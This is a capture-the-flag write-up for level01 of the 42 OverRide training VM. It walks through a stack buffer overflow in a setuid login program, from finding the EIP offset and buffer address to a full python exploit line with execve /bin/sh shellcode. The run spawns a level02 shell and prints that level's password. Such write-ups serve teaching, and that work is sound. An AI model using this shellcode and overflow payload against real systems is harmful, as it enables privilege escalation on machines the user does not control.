# 1st Step
  
List the files will show us `level01` executable
```
level01@OverRide:~$ ls -l
total 8
-rwsr-s---+ 1 level02 users 7360 Sep 10  2016 level01
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: bla
verifying username....

nope, incorrect username...

level01@OverRide:~$
```
The program waits for a username/password and exit if it's not good.  
After analyze it with gdb we can find three interesting functions : `main()`, `verify_user_name` and `verify_user_pass`.  
Please refer to file [asm_analysis.md](https://github.com/maxisimo/42-OverRide/blob/main/level01/Ressources/asm_analysis.md) in parallel of [source.c](https://github.com/maxisimo/42-OverRide/blob/main/level01/source.c) for more details.  
A first read of ASM code allows us to see that function `verify_user_name` compares the user name to "dat_wil" and function `verify_user_pass` compares password to "admin".  
By looking closely to the code we can see that finding the password won't help us! Since there is no calls to `/bin/sh`, we can assume we'll have to use a shellcode this time.  
We'll have to write over `eip` in order to execute our shellcode, so first get the offset :
```
(gdb) run
Starting program: /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```
Thanks to the pattern generator we found an offset of 80.  
As the program use `fgets()` function we should not be able to make a buffer overflow but `fgets()` take a max string of 100 chars wich is more than the size of our buffer (64).  

## Create our exploit
*shellcode found [here](http://shell-storm.org/shellcode/files/shellcode-827.php) (23 bytes)*  
We'll use `ltrace` to find the buffer address where the password is stored:
```
level01@OverRide:~$ ltrace ./level01
__libc_start_main(0x80484d0, 1, -10364, 0x80485c0, 0x8048630 <unfinished ...>
puts("********* ADMIN LOGIN PROMPT ***"...********* ADMIN LOGIN PROMPT *********)           = 39
printf("Enter Username: ")                                                                  = 16
fgets(Enter Username: dat_wil
"dat_wil\n", 256, 0xf7fcfac0)                                                               = 0x0804a040
puts("verifying username....\n"verifying username....)                                      = 24
puts("Enter Password: "Enter Password:)                                                     = 17
fgets(doesn't matter
"doesn't matter\n", 100, 0xf7fcfac0)                                                        = 0xffffd69c    <--- here she are
puts("nope, incorrect password...\n"nope, incorrect password...)                            = 29
+++ exited (status 1) +++
level01@OverRide:~$
```
Our input will be as follow :  
bytes 1-7: "dat_wil", to pass the `verify_user_name` function.  
byte  8: '\n', so that the first `fgets` stops taking user input.  
bytes 9-31: 23 bytes for our shellcode.  
bytes 31-88: 57 bytes of padding (23 + 57 = 80 to overwrite EIP with the next 4 bytes).  
bytes 88-92: 0xffffd69c ("\x9c\xd6\xff\xff" in little endian)
```
level01@OverRide:~$ python -c 'print "dat_wil" + "\n" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "a" * 57 + "\x9c\xd6\xff\xff"' > /tmp/exploit
level01@OverRide:~$ cat /tmp/exploit - | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
exit
quit
level01@OverRide:~$ su level02
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02
level02@OverRide:~$
```
Level01 passed !
